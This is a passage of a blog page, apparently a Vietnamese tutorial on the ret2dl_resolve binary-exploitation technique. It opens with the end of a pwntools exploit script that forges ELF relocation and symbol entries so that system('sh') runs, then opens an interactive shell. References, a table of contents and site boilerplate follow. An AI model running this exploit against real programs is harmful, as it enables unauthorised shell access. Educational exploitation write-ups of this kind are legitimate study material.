class="string">&quot;FAKE ELF32_RELA addr1 : &quot;</span> + <span class="built_in">hex</span>(addr1))</span><br><span class="line">success(<span class="string">&quot;CACULATED reloc_args: &quot;</span> + <span class="built_in">hex</span>(reloc_args))</span><br><span class="line">addr2 = <span class="number">0x804af1c</span></span><br><span class="line">success(<span class="string">&quot;FAKE ELF32_SYM addr2 : &quot;</span> + <span class="built_in">hex</span>(addr2))</span><br><span class="line">r_info = (addr2- SYMTAB) // <span class="number">16</span></span><br><span class="line">r_info = (r_info &lt;&lt;<span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">success(<span class="string">&quot;r_info : &quot;</span> + <span class="built_in">hex</span>(r_info))</span><br><span class="line"></span><br><span class="line">string = <span class="number">0x0804af2c</span> - STRTAB</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(<span class="number">0x80482F0</span>) + p32(reloc_args) + <span class="string">b&#x27;sh\x00\x00&#x27;</span>+p32(<span class="number">0x0804af0c</span>)</span><br><span class="line">payload += p32(exe.got[<span class="string">&#x27;read&#x27;</span>]) + p32(r_info)+p32(string)+p32(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;system\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://syst3mfailure.io/ret2dl_resolve/">syst3mfailure</a></li>
+<li><a target="_blank" rel="noopener" href="http://phrack.org/issues/58/4.html">phrack article ở mục 5</a></li>
+<li><a target="_blank" rel="noopener" href="https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62">ricardo2197</a></li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="https://hackmd.io/_uploads/rJYR97M6h.png" data-sizes="auto" alt="ret2csu" class="lazyload">
+        
+        <a href="/2023/08/22/ret2csu/"></a>
+        <div class="article-nav-caption">Newer</div>
+        <h3 class="article-nav-title">
+          
+            ret2csu
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="https://hackmd.io/_uploads/SJ2MA8ZY3.png" data-sizes="auto" alt="TOCTOU attack" class="lazyload">
+      
+      <a href="/2023/07/04/toctou/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          TOCTOU attack
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Prerequisites"><span class="toc-number">1.</span> <span class="toc-text">Prerequisites :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Overview"><span class="toc-number">2.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Details"><span class="toc-number">3.</span> <span class="toc-text">Details:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#STRTAB"><span class="toc-number">3.1.</span> <span class="toc-text">STRTAB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SYMTAB"><span class="toc-number">3.2.</span> <span class="toc-text">SYMTAB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JMPREL"><span class="toc-number">3.3.</span> <span class="toc-text">JMPREL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#But-howww"><span class="toc-number">4.</span> <span class="toc-text">But howww ???</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Basic-algorithm-true-case"><span class="toc-number">4.1.</span> <span class="toc-text">Basic algorithm (true case)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Observation"><span class="toc-number">4.2.</span> <span class="toc-text">Observation:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cac-buoc-tinh"><span class="toc-number">4.3.</span> <span class="toc-text">Các bước tính:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo"><span class="toc-number">5.</span> <span class="toc-text">Demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">6.</span> <span class="toc-text">References</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/../images/avatar.jpg" data-sizes="auto" alt="whoisthatguy" class="lazyload">
+  <div class="sidebar-author-name">whoisthatguy</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">7</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/wh0isthatguy itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+    <div class="icon-twitter sidebar-social-icon">
+      <a href=https://twitter.com/im_whoisthatguy itemprop="url" target="_blank" aria-label="twitter"></a>
+    </div>
+  
+    <div class="icon-discord sidebar-social-icon">
+      <a href=https://discordapp.com/users/wh0isthatguy itemprop="url" target="_blank" aria-label="discord"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2024
+      <span class="footer-info-sep"></span>
+      whoisthatguy
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        10.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:03
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Prerequisites"><span class="toc-number">1.</span> <span class="toc-text">Prerequisites :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Overview"><span class="toc-number">2.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Details"><span class="toc-number">3.</span> <span class="toc-text">Details:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#STRTAB"><span class="toc-number">3.1.</span> <span class="toc-text">STRTAB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SYMTAB"><span class="toc-number">3.2.</span> <span class="toc-text">SYMTAB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JMPREL"><span class="toc-number">3.3.</span> <span class="toc-text">JMPREL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#But-howww"><span class="toc-number">4.</span> <span class="toc-text">But howww ???</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Basic-algorithm-true-case"><span class="toc-number">4.1.</span> <span class="toc-text">Basic algorithm (true case)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Observation"><span class="toc-number">4.2.</span> <span class="toc-text">Observation:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cac-buoc-tinh"><span class="toc-number">4.3.</span> <span class="toc-text">Các bước tính:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo"><span class="toc-number">5.</span> <span class="toc-text">Demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">6.</span> <span class="toc-text">References</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/../images/avatar.jpg" data-sizes="auto" alt="whoisthatguy" class="lazyload">
+  <div class="sidebar-author-name">whoisthatguy</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">7</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/wh0isthatguy itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+    <div class="icon-twitter sidebar-social-icon">
+      <a href=https://twitter.com/im_whoisthatguy itemprop="url" target="_blank" aria-label="twitter"></a>
+    </div>
+  
+    <div class="icon-discord sidebar-social-icon">
+      <a href=https://discordapp.com/users/wh0isthatguy itemprop="url" target="_blank" aria-label="discord"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+
+
+
+<script src="/live2d-widget/autoload.js"></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    quicklink.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.3.1' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
